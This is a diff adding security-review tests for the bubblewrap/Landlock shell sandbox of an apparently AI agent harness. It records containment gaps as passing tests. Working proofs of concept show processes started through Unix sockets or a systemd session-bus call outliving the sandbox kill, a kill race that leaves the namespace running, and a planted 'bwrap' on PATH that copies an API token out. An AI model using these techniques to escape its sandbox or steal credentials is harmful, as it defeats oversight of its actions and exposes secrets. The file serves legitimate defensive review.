@@ -1,0 +1,750 @@
+diff --git a/crates/cli/tests/review_t8a.rs b/crates/cli/tests/review_t8a.rs
+new file mode 100644
+index 0000000..ac5450e
+--- /dev/null
++++ b/crates/cli/tests/review_t8a.rs
+@@ -0,0 +1,531 @@
++//! T.8a REVIEW (docs/security-review/2026-11-T8a-containment.md), against
++//! branch `feat/T.8a-shell-containment`.
++//!
++//! Each `review_` test **passes on that branch, and passing is the gap**:
++//! invert the marked assertion when it is closed. They use the real
++//! `rizzy-harness sandbox-exec`, the real `bwrap` and the node's own
++//! command line (`Confinement::shell`). Where bubblewrap, Landlock or
++//! python3 is missing they skip with a printed reason.
++//!
++//! Every process a test starts is found by its unique `sleep <n>` command
++//! line and killed by exactly that pid when the test ends.
++
++#[path = "support/bwrap.rs"]
++mod bwrap;
++
++use std::ffi::OsString;
++use std::path::{Path, PathBuf};
++use std::sync::Arc;
++use std::time::{Duration, Instant};
++
++use harness_tools::sandbox::{Confinement, Grants, Sandbox, Settings};
++use harness_tools::{Bash, Tool, ToolCtx};
++use nix::sys::signal::{Signal, kill, killpg};
++use nix::unistd::Pid;
++use serde_json::json;
++
++const EXE: &str = env!("CARGO_BIN_EXE_rizzy-harness");
++/// `sandbox-exec` as a kernel with Landlock ABI 4 enforces it.
++const ABI4: &str = concat!(
++    env!("CARGO_MANIFEST_DIR"),
++    "/tests/support/review_t8a/landlock_abi4.py"
++);
++
++struct Fixture {
++    _dir: tempfile::TempDir,
++    root: PathBuf,
++    data: PathBuf,
++    ws: PathBuf,
++}
++
++fn fixture() -> Fixture {
++    let dir = tempfile::tempdir().unwrap();
++    let root = dir.path().canonicalize().unwrap();
++    let data = root.join("data");
++    let ws = root.join("home/proj");
++    std::fs::create_dir_all(&data).unwrap();
++    std::fs::create_dir_all(&ws).unwrap();
++    Fixture {
++        _dir: dir,
++        root,
++        data,
++        ws,
++    }
++}
++
++impl Fixture {
++    /// The contained sandbox and the wrapper's status line, or `None`
++    /// where Landlock or bubblewrap does not work here.
++    fn sandbox(&self) -> Option<(Arc<Sandbox>, String)> {
++        let sb = Sandbox::new(
++            PathBuf::from(EXE),
++            &Settings::default(),
++            Some(self.data.join("sandbox-tmp")),
++            std::slice::from_ref(&self.data),
++        )
++        .unwrap();
++        let status = match sb.probe(&self.data.join("sandbox-tmp/probe"), &self.data) {
++            Ok(s) => s,
++            Err(e) => {
++                eprintln!("SKIPPED: Landlock does not work here: {e}");
++                return None;
++            }
++        };
++        let sb = bwrap::contained(sb, &self.data.join("sandbox-tmp/probe-contain")).ok()?;
++        Some((Arc::new(sb), status))
++    }
++
++    fn confinement(&self, sb: Arc<Sandbox>) -> Confinement {
++        Confinement::Confined {
++            sandbox: sb,
++            tmp: None,
++        }
++        .for_session("s1")
++    }
++
++    fn ctx(&self, sb: Arc<Sandbox>) -> ToolCtx {
++        let mut ctx = ToolCtx::new(&self.ws);
++        ctx.protected = Arc::new(vec![self.data.clone()]);
++        ctx.sandbox = self.confinement(sb);
++        ctx
++    }
++
++    /// The node's command line for `bash -c <script>`: the program
++    /// (bubblewrap) and its arguments.
++    fn shell(&self, sb: Arc<Sandbox>, program: &str, args: &[&str]) -> tokio::process::Command {
++        let args: Vec<&std::ffi::OsStr> = args.iter().map(|a| a.as_ref()).collect();
++        let (cmd, contained) = self
++            .confinement(sb)
++            .shell(
++                program.as_ref(),
++                &args,
++                &self.ws,
++                None,
++                &Default::default(),
++                std::slice::from_ref(&self.data),
++                Grants {
++                    workspace_write: true,
++                    ..Default::default()
++                },
++            )
++            .unwrap();
++        assert!(contained);
++        cmd
++    }
++}
++
++/// The Landlock ABI from the status line (`effective_abi: V4` → 4).
++fn abi(status: &str) -> u32 {
++    let rest = status.split("effective_abi: V").nth(1).unwrap_or("0");
++    rest.chars()
++        .take_while(char::is_ascii_digit)
++        .collect::<String>()
++        .parse()
++        .unwrap_or(0)
++}
++
++fn have_python() -> bool {
++    let ok = std::process::Command::new("python3")
++        .arg("-V")
++        .output()
++        .is_ok_and(|o| o.status.success());
++    if !ok {
++        eprintln!("SKIPPED: no python3");
++    }
++    ok
++}
++
++fn alive(pid: i32) -> bool {
++    match std::fs::read_to_string(format!("/proc/{pid}/stat")) {
++        Ok(stat) => {
++            let state = stat.rsplit(')').next().unwrap_or("").trim_start();
++            !(state.starts_with('Z') || state.starts_with('X') || state.starts_with('x'))
++        }
++        Err(_) => false,
++    }
++}
++
++/// Every live process whose command line is exactly `sleep <secs>`.
++fn sleeps(secs: u32) -> Vec<i32> {
++    let want = format!("sleep\0{secs}\0");
++    std::fs::read_dir("/proc")
++        .unwrap()
++        .filter_map(|e| e.ok()?.file_name().to_str()?.parse::<i32>().ok())
++        .filter(|pid| {
++            std::fs::read(format!("/proc/{pid}/cmdline")).is_ok_and(|c| c == want.as_bytes())
++                && alive(*pid)
++        })
++        .collect()
++}
++
++/// Kills, on drop, every process still running one of these sleeps.
++struct Reaper(Vec<u32>);
++
++impl Drop for Reaper {
++    fn drop(&mut self) {
++        for secs in &self.0 {
++            for pid in sleeps(*secs) {
++                let _ = kill(Pid::from_raw(pid), Signal::SIGKILL);
++            }
++        }
++    }
++}
++
++fn wait_for(what: &str, mut done: impl FnMut() -> bool) {
++    let by = Instant::now() + Duration::from_secs(20);
++    while !done() {
++        assert!(Instant::now() < by, "never happened: {what}");
++        std::thread::sleep(Duration::from_millis(10));
++    }
++}
++
++fn pid_namespace(pid: i32) -> Option<PathBuf> {
++    std::fs::read_link(format!("/proc/{pid}/ns/pid")).ok()
++}
++
++/// A service of the node user's outside the sandbox that starts a process
++/// when asked over a Unix socket: the stand-in for the session bus
++/// (`systemd-run --user`), a container runtime's socket, a tmux server. One
++/// listener on a pathname socket outside every grant, one on an abstract
++/// socket; each connection starts `sleep <secs>` as a child of this test.
++fn service(path: &Path, abstract_name: &str, secs_path: u32, secs_abstract: u32) {
++    use std::os::linux::net::SocketAddrExt;
++    use std::os::unix::net::{SocketAddr, UnixListener};
++    let by_path = UnixListener::bind(path).unwrap();
++    let by_name =
++        UnixListener::bind_addr(&SocketAddr::from_abstract_name(abstract_name).unwrap()).unwrap();
++    for (listener, secs) in [(by_path, secs_path), (by_name, secs_abstract)] {
++        std::thread::spawn(move || {
++            for conn in listener.incoming() {
++                if conn.is_ok() {
++                    let _ = std::process::Command::new("sleep")
++                        .arg(secs.to_string())
++                        .stdin(std::process::Stdio::null())
++                        .stdout(std::process::Stdio::null())
++                        .stderr(std::process::Stdio::null())
++                        .spawn();
++                }
++            }
++        });
++    }
++}
++
++/// What the command runs to reach the service: one connect to each socket.
++fn connect_script(path: &Path, abstract_name: &str) -> String {
++    format!(
++        "python3 -c 'import socket\n\
++         for a in (\"{}\", \"\\0{abstract_name}\"):\n\
++         \x20   s = socket.socket(socket.AF_UNIX)\n\
++         \x20   try:\n\
++         \x20       s.connect(a); print(\"unix-\" + \"connected\")\n\
++         \x20   except OSError as e: print(\"refused:\", e)\n\
++         '",
++        path.display()
++    )
++}
++
++/// T8A-1, on this kernel, through the real wrapper and the real `bash`
++/// tool. What decides whether "nothing a command starts outlives it" is
++/// true is not bubblewrap but Landlock's two newest rights, which the
++/// wrapper only asks for best-effort: from ABI 9 on the pathname socket is
++/// refused, from ABI 6 on the abstract one. Below, the command talks to the
++/// service and what the service starts is outside the namespace: it is
++/// alive after the command ended. This test records which side of the line
++/// the kernel is on, as `pathname_unix_sockets_need_abi_9` does for the
++/// file policy; `doctor` prints "nothing a command starts outlives it" on
++/// both sides.
++#[tokio::test]
++async fn review_t8a_1_what_a_service_outside_starts_outlives_the_command_below_abi_9() {
++    let f = fixture();
++    let Some((sb, status)) = f.sandbox() else {
++        return;
++    };
++    if !have_python() {
++        return;
++    }
++    let (bus, name) = (
++        f.root.join("bus"),
++        format!("review-t8a-{}", std::process::id()),
++    );
++    let reaper = Reaper(vec![975_101, 975_102]);
++    service(&bus, &name, 975_101, 975_102);
++    let r = Bash
++        .run(
++            &f.ctx(sb),
++            json!({"command": format!("echo self=$$; {}", connect_script(&bus, &name))}),
++        )
++        .await;
++    assert!(r.output.contains("self=2"), "not contained: {}", r.output);
++    std::thread::sleep(Duration::from_secs(2));
++    let (by_path, by_name) = (!sleeps(975_101).is_empty(), !sleeps(975_102).is_empty());
++    eprintln!(
++        "Landlock ABI {}: after the contained command ended, the process started through the \
++         pathname socket is {}, the one through the abstract socket is {}",
++        abi(&status),
++        if by_path { "RUNNING" } else { "not there" },
++        if by_name { "RUNNING" } else { "not there" },
++    );
++    // The gap, where the kernel is older: these two flip to `false` on
++    // every kernel once the containment itself closes the sockets.
++    assert_eq!(by_path, abi(&status) < 9, "{}", r.output);
++    assert_eq!(by_name, abi(&status) < 6, "{}", r.output);
++    drop(reaper);
++}
++
++/// T8A-1, shown on any kernel: the node's exact bubblewrap command line
++/// with the wrapper replaced by what a kernel with Landlock ABI 4 enforces
++/// (`support/review_t8a/landlock_abi4.py`). The command is in its PID
++/// namespace and the file policy holds; one connect to a Unix socket of a
++/// service outside makes that service start a process. The node's kill
++/// (SIGKILL to bubblewrap) then ends everything inside, the `setsid` child
++/// included, and leaves what the service started.
++#[tokio::test]
++async fn review_t8a_1_with_abi_4_rights_one_connect_leaves_a_process_the_kill_does_not_reach() {
++    let f = fixture();
++    let Some((sb, _)) = f.sandbox() else { return };
++    if !have_python() {
++        return;
++    }
++    let (bus, name) = (
++        f.root.join("bus"),
++        format!("review-t8a-old-{}", std::process::id()),
++    );
++    let secret = f.root.join("home/secret");
++    std::fs::write(&secret, "outside the session folder").unwrap();
++    let reaper = Reaper(vec![975_111, 975_112, 975_113, 975_114]);
++    service(&bus, &name, 975_111, 975_112);
++    let script = format!(
++        "cat {} && echo FILE-POLICY-BROKEN; {}; setsid sleep 975113 & sleep 975114",
++        secret.display(),
++        connect_script(&bus, &name)
++    );
++    // The node's command line, with `<harness> sandbox-exec` replaced.
++    let node = f.shell(sb, "bash", &["-c", &script]);
++    let node = node.as_std();
++    let argv: Vec<OsString> = node.get_args().map(OsString::from).collect();
++    let at = argv.iter().position(|a| a == EXE).unwrap();
++    assert_eq!(argv[at + 1], "sandbox-exec");
++    let mut old = std::process::Command::new(node.get_program());
++    old.args(&argv[..at])
++        .args(["python3", "-I", ABI4])
++        .args(&argv[at + 2..])
++        .env_clear()
++        .env("PATH", std::env::var_os("PATH").unwrap_or_default())
++        .current_dir(&f.ws)
++        .stdin(std::process::Stdio::null())
++        .stdout(std::process::Stdio::piped())
++        .stderr(std::process::Stdio::piped());
++    std::os::unix::process::CommandExt::process_group(&mut old, 0);
++    let child = old.spawn().unwrap();
++    let bwrap_pid = child.id() as i32;
++
++    wait_for("the four processes", || {
++        reaper.0.iter().all(|s| !sleeps(*s).is_empty())
++    });
++    let ours = pid_namespace(std::process::id() as i32);
++    for inside in [975_113, 975_114] {
++        let ns = pid_namespace(sleeps(inside)[0]);
++        assert!(ns.is_some() && ns != ours, "not in a PID namespace: {ns:?}");
++    }
++    for outside in [975_111, 975_112] {
++        assert_eq!(pid_namespace(sleeps(outside)[0]), ours);
++    }
++
++    // The node's kill at the end of a cancel or a timeout.
++    killpg(Pid::from_raw(bwrap_pid), Signal::SIGKILL).unwrap();
++    let out = child.wait_with_output().unwrap();
++    let out =
++        String::from_utf8_lossy(&out.stdout).into_owned() + &String::from_utf8_lossy(&out.stderr);
++    assert!(!out.contains("FILE-POLICY-BROKEN"), "{out}");
++    wait_for("the namespace's end", || {
++        sleeps(975_113).is_empty() && sleeps(975_114).is_empty()
++    });
++    std::thread::sleep(Duration::from_secs(2));
++    // The gap: both are `true`. Closed, they are `false`.
++    assert!(
++        !sleeps(975_111).is_empty(),
++        "closed: nothing reached the pathname socket: {out}"
++    );
++    assert!(
++        !sleeps(975_112).is_empty(),
++        "closed: nothing reached the abstract socket: {out}"
++    );
++    drop(reaper);
++}
++
++fn read(path: String) -> String {
++    std::fs::read_to_string(path).unwrap_or_default()
++}
++
++/// The namespace init's host pid: bubblewrap's only child.
++fn init_of(bwrap: i32) -> Option<i32> {
++    read(format!("/proc/{bwrap}/task/{bwrap}/children"))
++        .split_whitespace()
++        .next()?
++        .parse()
++        .ok()
++}
++
++/// Whether `pid` leads its own session (the init after `--new-session`).
++fn leads_a_session(pid: i32) -> bool {
++    let stat = read(format!("/proc/{pid}/stat"));
++    let mut fields = stat.rsplit(')').next().unwrap_or("").split_whitespace();
++    // After the name: state, ppid, pgrp, session.
++    fields.nth(3).and_then(|s| s.parse::<i32>().ok()) == Some(pid)
++}
++
++/// T8A-2. The node's kill is SIGKILL to bubblewrap's process group
++/// (`KillGroupOnDrop`, tokio's `kill_on_drop`, the SIGKILL after the grace).
++/// It ends the namespace only through `PR_SET_PDEATHSIG`, which bwrap's init
++/// sets itself, late (`bubblewrap.c`: `setsid`, then the fork of the
++/// command, then `do_init` calls `handle_die_with_parent`): after its
++/// mounts and after `setsid`, so it is no longer in the group that is
++/// killed. A kill in
++/// that moment leaves the init without a parent and without a death
++/// signal: the command runs to its own end, in a namespace nobody holds,
++/// while the node, alive, has reported the call as ended. Nothing on the
++/// kill path looks at the init again.
++///
++/// The test triggers it from outside: it kills the group the instant
++/// `/proc` shows the init leading its own session. It is a race, so it
++/// tries until the first survivor. Measured on the review machine (Linux
++/// 7.2, bubblewrap 0.13.1): the first or second try; with
++/// `REVIEW_T8A_TRIES=20` and `REVIEW_T8A_DELAY_US` of 0, 20, 50 and 100:
++/// 19, 14, 1 and 0 of 20 survived, so the window is about 50 microseconds
++/// wide, half a millisecond after the spawn.
++#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
++async fn review_t8a_2_a_kill_just_after_the_inits_setsid_leaves_the_namespace_running() {
++    const SECS: u32 = 975_120;
++    let env = |k: &str| std::env::var(k).ok().and_then(|v| v.parse::<u64>().ok());
++    let delay_us = env("REVIEW_T8A_DELAY_US").unwrap_or(0);
++    let count = env("REVIEW_T8A_TRIES");
++    let tries = count.unwrap_or(600) as u32;
++    let mut survivors = 0;
++    let f = fixture();
++    let Some((sb, _)) = f.sandbox() else { return };
++    let reaper = Reaper(vec![SECS]);
++    let mut survived = None;
++    for attempt in 1..=tries {
++        let mut cmd = f.shell(sb.clone(), "sleep", &[&SECS.to_string()]);
++        cmd.stdin(std::process::Stdio::null())
++            .stdout(std::process::Stdio::null())
++            .stderr(std::process::Stdio::null())
++            .process_group(0)
++            .kill_on_drop(true);
++        // As the bash tool starts it: from the spawner thread.
++        let mut child = harness_tools::contain::spawn_for_test(cmd).await.unwrap();
++        let bwrap_pid = child.id().unwrap() as i32;
++        let by = Instant::now() + Duration::from_millis(200);
++        let mut init = None;
++        while Instant::now() < by {
++            init = init.or_else(|| init_of(bwrap_pid));
++            if init.is_some_and(leads_a_session) {
++                break;
++            }
++            std::hint::spin_loop();
++        }
++        // To measure the window: `REVIEW_T8A_DELAY_US=<n>` waits n
++        // microseconds more, and `REVIEW_T8A_TRIES=<n>` counts survivors
++        // over n tries instead of stopping at the first.
++        let until = Instant::now() + Duration::from_micros(delay_us);
++        while Instant::now() < until {
++            std::hint::spin_loop();
++        }
++        // What `KillGroupOnDrop` does when the call is dropped.
++        let _ = killpg(Pid::from_raw(bwrap_pid), Signal::SIGKILL);
++        let _ = child.wait().await;
++        // The node is done with the call here. Is the command?
++        tokio::time::sleep(Duration::from_millis(400)).await;
++        let left = sleeps(SECS);
++        if !left.is_empty() {
++            let init = init.unwrap();
++            assert!(alive(init), "the init is gone but its command runs");
++            assert!(!alive(bwrap_pid), "bubblewrap itself is still there");
++            survivors += 1;
++            eprintln!(
++                "try {attempt}: bubblewrap {bwrap_pid} was killed and reaped; its init {init} \
++                 and `sleep {SECS}` (pid {}) are still running, parent now {}",
++                left[0],
++                read(format!("/proc/{init}/stat"))
++                    .rsplit(')')
++                    .next()
++                    .and_then(|s| s.split_whitespace().nth(1).map(str::to_string))
++                    .unwrap_or_default(),
++            );
++            survived = Some(attempt);
++            // Clean up: killing the init from outside ends its namespace.
++            let _ = kill(Pid::from_raw(init), Signal::SIGKILL);
++            if count.is_none() {
++                break;
++            }
++            tokio::time::sleep(Duration::from_millis(100)).await;
++        }
++    }
++    if count.is_some() {
++        eprintln!("kill {delay_us} us after the setsid was seen: {survivors}/{tries} survived");
++    }
++    drop(reaper);
++    // The gap: `Some`. Closed (the node kills the init it read, or holds a
++    // pidfd of it), no try leaves a survivor.
++    assert!(
++        survived.is_some(),
++        "no namespace survived its kill in {tries} tries: closed, or the race was not hit"
++    );
++}
++
++/// N-1. The node runs the first `bwrap` on its `PATH`, outside the
++/// sandbox, at every start and for every command, and checks only that it
++/// is a file. One planted in a folder a session can write (a project's
++/// `bin`, an activated virtualenv, `~/.local/bin` under a `[sandbox] write`
++/// entry) runs with the node's rights the next time the node or `doctor`
++/// starts: here it copies the API token out of the data directory. The
++/// node's own git is found the same way, so this is the existing trust in
++/// `PATH`, not a new kind; it is recorded because bubblewrap is the one
++/// program in the command path that is never inside Landlock.
++#[test]
++fn review_t8a_n1_the_first_bwrap_on_path_runs_outside_the_sandbox() {
++    let f = fixture();
++    let Ok(real) = harness_tools::contain::find_bwrap() else {
++        eprintln!("SKIPPED: no bubblewrap");
++        return;
++    };
++    std::fs::write(f.data.join("api-token"), "the-node's-token").unwrap();
++    let bin = f.ws.join("bin");
++    std::fs::create_dir_all(&bin).unwrap();
++    let planted = bin.join("bwrap");
++    std::fs::write(
++        &planted,
++        format!(
++            "#!/bin/sh\ncat {}/api-token > {}/stolen\nexec {} \"$@\"\n",
++            f.data.display(),
++            f.ws.display(),
++            real.display()
++        ),
++    )
++    .unwrap();
++    std::fs::set_permissions(
++        &planted,
++        std::os::unix::fs::PermissionsExt::from_mode(0o755),
++    )
++    .unwrap();
++    let mut path = OsString::from(&bin);
++    path.push(":");
++    path.push(std::env::var_os("PATH").unwrap_or_default());
++    let out = std::process::Command::new(EXE)
++        .args(["--data-dir", f.data.to_str().unwrap(), "doctor"])
++        .env("PATH", path)
++        .output()
++        .unwrap();
++    let out = String::from_utf8_lossy(&out.stdout).into_owned();
++    let line = out
++        .lines()
++        .find(|l| l.contains("shell containment"))
++        .unwrap_or_default();
++    eprintln!("{line}");
++    // The gap: the planted program is accepted and has run unconfined.
++    assert!(line.contains(planted.to_str().unwrap()), "{out}");
++    assert_eq!(
++        std::fs::read_to_string(f.ws.join("stolen")).unwrap_or_default(),
++        "the-node's-token"
++    );
++}
+diff --git a/crates/cli/tests/support/review_t8a/kill_window.py b/crates/cli/tests/support/review_t8a/kill_window.py
+new file mode 100755
+index 0000000..5728405
+--- /dev/null
++++ b/crates/cli/tests/support/review_t8a/kill_window.py
+@@ -0,0 +1,92 @@
++#!/usr/bin/env python3
++"""T.8a review, T8A-2: how long after a spawn does killing the node, or
++bubblewrap's process group, leave the namespace running?
++
++    kill_window.py node  <delay-us>...   SIGKILL to the spawning process (the
++                                         node) <delay> after its spawn returned
++    kill_window.py group <delay-us>...   SIGKILL to bubblewrap's process group
++                                         (KillGroupOnDrop, kill_on_drop)
++
++Each delay is tried REPS times (default 40). The command line is the node's
++(`--die-with-parent --new-session --unshare-pid --dev-bind / / --proc /proc`)
++running `sleep <n>`; survivors are found by that command line 1.5 s later and
++killed by pid, with the bwrap init that is their parent. Writes no file.
++"""
++import os, signal, subprocess, sys, time
++REPS = int(os.environ.get("REPS", "40"))
++D = os.path.dirname(os.path.abspath(__file__))
++SECS = 976700 + (os.getpid() % 90)
++
++def sleeps():
++    want = b"sleep\0%d\0" % SECS
++    out = []
++    for p in os.listdir("/proc"):
++        if p.isdigit():
++            try:
++                if open(f"/proc/{p}/cmdline", "rb").read() == want:
++                    st = open(f"/proc/{p}/stat").read().rsplit(")", 1)[1].split()[0]
++                    if st not in "ZXx":
++                        out.append(int(p))
++            except OSError:
++                pass
++    return out
++
++def bwrap_argv():
++    return ["bwrap", "--die-with-parent", "--new-session", "--unshare-pid",
++            "--dev-bind", "/", "/", "--proc", "/proc", "--chdir", D, "--",
++            "sleep", str(SECS)]
++
++def busy_wait(us):
++    end = time.perf_counter() + us / 1e6
++    while time.perf_counter() < end:
++        pass
++
++def one(mode, us):
++    if mode == "group":
++        p = subprocess.Popen(bwrap_argv(), process_group=0,
++                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
++                             stderr=subprocess.DEVNULL)
++        busy_wait(us)
++        try: os.killpg(p.pid, signal.SIGKILL)
++        except ProcessLookupError: pass
++        p.wait()
++    else:
++        r, w = os.pipe()
++        node = os.fork()
++        if node == 0:
++            os.close(r)
++            p = subprocess.Popen(bwrap_argv(), process_group=0,
++                                 stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
++                                 stderr=subprocess.DEVNULL)
++            os.write(w, b"x")
++            time.sleep(1000)
++            os._exit(0)
++        os.close(w)
++        os.read(r, 1); os.close(r)
++        busy_wait(us)
++        os.kill(node, signal.SIGKILL)
++        os.waitpid(node, 0)
++    # anything still alive 1.5 s later survived its killer
++    time.sleep(0.05)
++    by = time.time() + 1.5
++    left = sleeps()
++    while left and time.time() < by:
++        time.sleep(0.05); left = sleeps()
++    for pid in left:
++        # the survivor: kill the sleep itself and its namespace init (its parent)
++        try:
++            ppid = int(open(f"/proc/{pid}/stat").read().rsplit(")", 1)[1].split()[1])
++        except OSError:
++            ppid = 0
++        for q in (pid, ppid):
++            if q > 1:
++                try:
++                    if q == pid or b"bwrap" in open(f"/proc/{q}/cmdline", "rb").read():
++                        os.kill(q, signal.SIGKILL)
++                except OSError: pass
++    return bool(left)
++
++mode = sys.argv[1]
++for us in map(int, sys.argv[2:]):
++    n = sum(one(mode, us) for _ in range(REPS))
++    print(f"{mode}: kill {us:>6} us after spawn: {n}/{REPS} namespaces survived", flush=True)
+diff --git a/crates/cli/tests/support/review_t8a/landlock_abi4.py b/crates/cli/tests/support/review_t8a/landlock_abi4.py
+new file mode 100755
+index 0000000..801cb47
+--- /dev/null
++++ b/crates/cli/tests/support/review_t8a/landlock_abi4.py
+@@ -0,0 +1,55 @@
++#!/usr/bin/env python3
++"""T.8a review: a stand-in for `rizzy-harness sandbox-exec` on a kernel with
++Landlock ABI 4 (Ubuntu 24.04's 6.8, the kernel README.md names).
++
++It takes the wrapper's arguments (`--rw <expect> <path>`, `--ro <expect>
++<path>`, `-- <command>`), applies the rights such a kernel has (the
++filesystem rights of ABI 1 to 3; no device-ioctl right, no abstract-socket or
++signal scope, no pathname-socket right), sets `no_new_privs` and execs the
++command. The real wrapper asks for the newer rights best-effort
++(`crates/tools/src/sandbox.rs`, `imp::restrict`), so on such a kernel this is
++what it enforces. Identities are not checked here: the proofs that use this
++do not swap folders.
++"""
++import ctypes
++import os
++import sys
++
++libc = ctypes.CDLL(None, use_errno=True)
++FS_ABI3 = (1 << 15) - 1  # LANDLOCK_ACCESS_FS_EXECUTE .. _TRUNCATE
++FS_FILE = (1 << 0) | (1 << 1) | (1 << 2) | (1 << 14)  # execute, write, read, truncate
++FS_READ = (1 << 0) | (1 << 2) | (1 << 3)  # execute, read file, read dir
++
++
++def check(ok, what):
++    if not ok:
++        sys.exit(f"landlock_abi4.py: {what}: {os.strerror(ctypes.get_errno())}")
++
++
++args = sys.argv[1:]
++rules, i = [], 0
++while args[i] != "--":
++    if args[i] in ("--rw", "--ro"):
++        rules.append((args[i], args[i + 2]))
++        i += 3
++    else:
++        i += 1
++command = args[i + 1:]
++
++handled = ctypes.c_uint64(FS_ABI3)  # struct landlock_ruleset_attr, first field only
++ruleset = libc.syscall(444, ctypes.byref(handled), ctypes.c_size_t(8), 0)
++check(ruleset >= 0, "landlock_create_ruleset")
++for kind, path in rules:
++    try:
++        fd = os.open(path, os.O_PATH | os.O_CLOEXEC)
++    except FileNotFoundError:
++        continue
++    access = FS_ABI3 if kind == "--rw" else FS_READ
++    if not os.path.isdir(path):
++        access &= FS_FILE
++    # struct landlock_path_beneath_attr { __u64 allowed_access; __s32 parent_fd; } packed
++    attr = access.to_bytes(8, "little") + fd.to_bytes(4, "little", signed=True)
++    check(libc.syscall(445, ruleset, 1, attr, 0) == 0, f"landlock_add_rule {path}")
++check(libc.prctl(38, 1, 0, 0, 0) == 0, "no_new_privs")
++check(libc.syscall(446, ruleset, 0) == 0, "landlock_restrict_self")
++os.execvp(command[0], command)
+diff --git a/crates/cli/tests/support/review_t8a/session_bus.sh b/crates/cli/tests/support/review_t8a/session_bus.sh
+new file mode 100755
+index 0000000..d3e607e
+--- /dev/null
++++ b/crates/cli/tests/support/review_t8a/session_bus.sh
+@@ -0,0 +1,48 @@
++#!/bin/bash
++# T.8a review, T8A-1 on a real session bus: one StartTransientUnit call from
++# inside a contained command (what `systemd-run --user` sends; systemd's own
++# client refuses to talk from a PID namespace, `gdbus` and libdbus do not),
++# then the node's kill (SIGKILL to bubblewrap).
++#
++#   session_bus.sh                      the wrapper as a kernel with Landlock
++#                                       ABI 4 enforces it (landlock_abi4.py)
++#   session_bus.sh <rizzy-harness>      the real wrapper on this kernel
++#
++# Needs bwrap, gdbus, python3 and a systemd user session. It starts one
++# transient unit `rizzy-review-t8a-<pid>` and stops it at the end; scratch
++# files go to a folder under $TMPDIR that it removes.
++set -u
++HERE=$(cd "$(dirname "$0")" && pwd)
++D=$(mktemp -d); trap 'rm -rf "$D"' EXIT
++WS=$D/ws; TMP=$D/tmp; mkdir -p "$WS" "$TMP"; echo SECRET > "$D/secret"
++U=rizzy-review-t8a-$$; N=$((975200 + $$ % 90)); UID_=$(id -u)
++ident() { stat -c '%d:%i' "$1"; }
++if [ $# -ge 1 ]; then wrapper=("$1" sandbox-exec); else wrapper=(python3 -I "$HERE/landlock_abi4.py"); fi
++# The node's command line (crates/tools/src/contain.rs, sandbox.rs `wrapper`).
++cmd=(bwrap --die-with-parent --new-session --unshare-pid --dev-bind / / --proc /proc --chdir "$WS" --
++     "${wrapper[@]}"
++     --rw "$(ident "$WS"):the session's folder" "$WS" --rw "$(ident "$TMP"):the session's temp folder" "$TMP")
++for d in /dev/null /dev/zero /dev/full /dev/random /dev/urandom; do cmd+=(--rw system $d); done
++for d in /usr /bin /sbin /lib /lib32 /lib64 /libx32 /etc /opt /proc; do [ -e $d ] && cmd+=(--ro system $d); done
++script="export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$UID_/bus
++cat $D/secret 2>&1
++gdbus call --session --dest org.freedesktop.systemd1 --object-path /org/freedesktop/systemd1 \
++  --method org.freedesktop.systemd1.Manager.StartTransientUnit $U.service fail \
++  \"[('ExecStart', <[('/bin/sh', ['/bin/sh', '-c', 'cat $D/secret > $D/leak; exec sleep $N'], false)]>)]\" '[]' 2>&1
++echo StartTransientUnit rc=\$?
++setsid sleep $((N + 1)) & sleep $((N + 2))"
++(cd "$WS" && exec env -i PATH="$PATH" HOME="$HOME" TMPDIR="$TMP" setsid "${cmd[@]}" -- bash -c "$script") 2>&1 | grep -v bashrc &
++sleep 2
++BW=$(pgrep -n -f "^bwrap .*sleep $((N + 2))")
++inside() { echo "$(pgrep -f "^sleep $((N + 1))\$" | wc -l) setsid child, $(pgrep -f "^sleep $((N + 2))\$" | wc -l) foreground"; }
++echo "before the kill: inside the namespace: $(inside); the unit: $(systemctl --user is-active $U)"
++kill -KILL -- "-$BW"
++sleep 2
++echo "after the kill:  inside the namespace: $(inside); the unit: $(systemctl --user is-active $U)"
++P=$(systemctl --user show -p MainPID --value $U)
++if [ "${P:-0}" != 0 ]; then
++  echo "  the unit's process $P: $(tr '\0' ' ' < /proc/$P/cmdline)"
++  echo "  pid namespace $(readlink /proc/$P/ns/pid), the host's is $(readlink /proc/self/ns/pid); $(grep NoNewPrivs /proc/$P/status | tr '\t' ' ')"
++  echo "  it copied a file from outside the session folder: $(cat "$D/leak" 2>&1)"
++fi
++systemctl --user stop $U 2>/dev/null; echo "cleaned up: the unit is $(systemctl --user is-active $U)"
